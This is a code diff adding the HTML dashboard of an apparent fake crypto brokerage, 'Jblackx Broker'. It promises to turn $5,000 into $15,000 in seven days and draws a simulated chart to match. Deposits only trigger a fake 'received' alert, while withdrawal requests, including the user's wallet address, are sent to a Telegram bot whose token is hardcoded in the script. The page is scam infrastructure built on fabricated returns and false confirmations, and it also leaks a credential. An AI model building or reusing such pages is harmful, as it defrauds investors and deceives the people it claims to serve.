@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Dashboard - Jblackx Broker</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+  <div class="container">
+    <h2>📊 Welcome to Your Investment Dashboard</h2>
+
+    <div class="card">
+      <p>💼 Account Holder: <strong>Mr. Jblackx</strong></p>
+      <p>💰 Balance: <strong>$5,000</strong></p>
+      <p>📈 ROI Projection: <strong>$15,000 in 7 Days</strong></p>
+    </div>
+
+    <canvas id="btcChart" width="400" height="200"></canvas>
+
+    <div class="btn-row">
+      <button onclick="openDeposit()">💳 Deposit</button>
+      <button onclick="openWithdraw()">🏧 Withdraw</button>
+      <button onclick="openPDF()">🧾 Generate Receipt</button>
+    </div>
+  </div>
+
+  <!-- Deposit Modal -->
+  <div id="depositModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('depositModal')">&times;</span>
+      <h3>💳 Deposit Funds</h3>
+      <input type="number" id="depositAmount" placeholder="Enter amount in USD">
+      <button onclick="submitDeposit()">Submit</button>
+    </div>
+  </div>
+
+  <!-- Withdraw Modal -->
+  <div id="withdrawModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal('withdrawModal')">&times;</span>
+      <h3>🏧 Withdraw Funds</h3>
+      <input type="number" id="withdrawAmount" placeholder="Enter amount in USD">
+      <input type="text" id="wallet" placeholder="Enter BTC Wallet Address">
+      <button onclick="submitWithdraw()">Submit</button>
+    </div>
+  </div>
+
+  <script>
+    // Chart.js simulation
+    const ctx = document.getElementById("btcChart").getContext("2d");
+    new Chart(ctx, {
+      type: "line",
+      data: {
+        labels: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
+        datasets: [{
+          label: "Portfolio Value",
+          data: [5000, 5500, 6700, 8000, 9200, 11000, 15000],
+          backgroundColor: "rgba(0, 123, 255, 0.1)",
+          borderColor: "#007bff",
+          borderWidth: 2,
+          tension: 0.3
+        }]
+      },
+      options: {
+        responsive: true
+      }
+    });
+
+    function openDeposit() {
+      document.getElementById("depositModal").style.display = "block";
+    }
+
+    function openWithdraw() {
+      document.getElementById("withdrawModal").style.display = "block";
+    }
+
+    function closeModal(id) {
+      document.getElementById(id).style.display = "none";
+    }
+
+    function submitDeposit() {
+      const amount = document.getElementById("depositAmount").value;
+      alert(`💳 Deposit of $${amount} received. Your investment is now active.`);
+      closeModal("depositModal");
+    }
+
+    function submitWithdraw() {
+      const amount = document.getElementById("withdrawAmount").value;
+      const wallet = document.getElementById("wallet").value;
+
+      const message = `🟠 *Withdrawal Request*\n💰 Amount: $${amount}\n💼 Wallet: \`${wallet}\`\n⏰ Time: ${new Date().toLocaleString()}`;
+      const token = "8313979154:AAFQ9nl0yINqmAp3dgpOrSwrNAeP9YN1k3g";
+      const chat_id = "@Officialwoongna";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(() => {
+        alert("✅ Withdrawal submitted. Processing in 24 hours.");
+        closeModal("withdrawModal");
+      });
+    }
+
+    function openPDF() {
+      window.open("receipt.pdf", "_blank");
+    }
+  </script>
+
+  <style>
+    .card {
+      background: #f5f5f5;
+      border-left: 6px solid #007bff;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      border-radius: 12px;
+    }
+    .btn-row {
+      display: flex;
+      justify-content: space-around;
+      gap: 1rem;
+      margin-top: 1rem;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+    }
+    .modal-content {
+      background: white;
+      padding: 2rem;
+      margin: 15% auto;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+    }
+    .modal-content input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 1rem;
+    }
+    .close {
+      float: right;
+      font-size: 24px;
+      cursor: pointer;
+    }
+  </style>
+</body>
+</html>
